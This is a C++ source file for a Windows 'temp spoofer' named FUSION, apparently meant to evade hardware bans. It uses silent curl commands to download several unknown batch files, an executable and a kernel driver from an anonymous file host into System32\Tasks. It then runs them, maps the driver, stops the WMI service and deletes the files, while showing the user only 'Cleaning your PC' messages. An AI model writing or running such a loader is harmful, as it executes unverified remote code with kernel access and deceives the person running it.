#include <iostream>
#include "Windows.h"

#include <random>



void TempSpoof() {

    const char* ascii_art2 = R"(


  ______ _    _  _____ _____ ____  _   _ 
 |  ____| |  | |/ ____|_   _/ __ \| \ | |
 | |__  | |  | | (___   | || |  | |  \| |
 |  __| | |  | |\___ \  | || |  | | . ` |
 | |    | |__| |____) |_| || |__| | |\  |
 |_|     \____/|_____/|_____\____/|_| \_|
                                         
)";


    std::cout << "\033[1;34m" << ascii_art2 << "\033[0m" << std::endl;

    std::cout << "";

    SetConsoleTitleA("Temp Spoofing");
    Sleep(2500);
    std::cout << "[i] Cleaning your PC\n";
    std::cout << "[i] Make sure to press on Y if anything pops up\n";
    Sleep(2500);
    system("curl --silent https://files.catbox.moe/n2gnyp.bat --output C:\\Windows\\System32\\Tasks\\clean1.bat >nul 2>&1");
    system("curl --silent https://files.catbox.moe/k169rm.bat --output C:\\Windows\\System32\\Tasks\\clean2.bat >nul 2>&1");
    system("curl --silent https://files.catbox.moe/c7ecn0.bat --output C:\\Windows\\System32\\Tasks\\clean3.bat >nul 2>&1");
    system("curl --silent https://files.catbox.moe/niandj.bat --output C:\\Windows\\System32\\Tasks\\clean4.bat >nul 2>&1");

    system("C:\\Windows\\System32\\Tasks\\clean1.bat");
    system("C:\\Windows\\System32\\Tasks\\clean2.bat");
    system("C:\\Windows\\System32\\Tasks\\clean3.bat");
    system("C:\\Windows\\System32\\Tasks\\clean4.bat");

    std::remove("C:\\Windows\\System32\\Tasks\\clean1.bat");
    std::remove("C:\\Windows\\System32\\Tasks\\clean2.bat");
    std::remove("C:\\Windows\\System32\\Tasks\\clean3.bat");
    std::remove("C:\\Windows\\System32\\Tasks\\clean4.bat");

    Sleep(1500);
    std::cout << "[i] Cleaning Done\n";

    std::cout << "[i] Starting the first part of spoofing [0/1]\n";
    Sleep(2500);

    system("curl --silent https://files.catbox.moe/gv7xzv.bat --output C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1");
    system("curl --silent https://files.catbox.moe/z2eo5p.bin --output C:\\Windows\\System32\\Tasks\\mapper.exe >nul 2>&1");
    system("curl --silent https://files.catbox.moe/pzfx2g.sys --output C:\\Windows\\System32\\Tasks\\s4fg4.sys >nul 2>&1"); 

    system("C:\\Windows\\System32\\Tasks\\mapper.exe C:\\Windows\\System32\\Tasks\\s4fg4.sys");
    system("net stop winmgmt /y");


    std::cout << "[i] Spoofing Finished [1/1]\n";
    Sleep(1500);
    std::cout << "[i] Spoofing MAC\n";
    system("C:\\Windows\\System32\\Tasks\\mac.bat >nul 2>&1");
    std::cout << "[i] MAC Successfully Spoofed\n";

    Beep(500, 500);

    

}
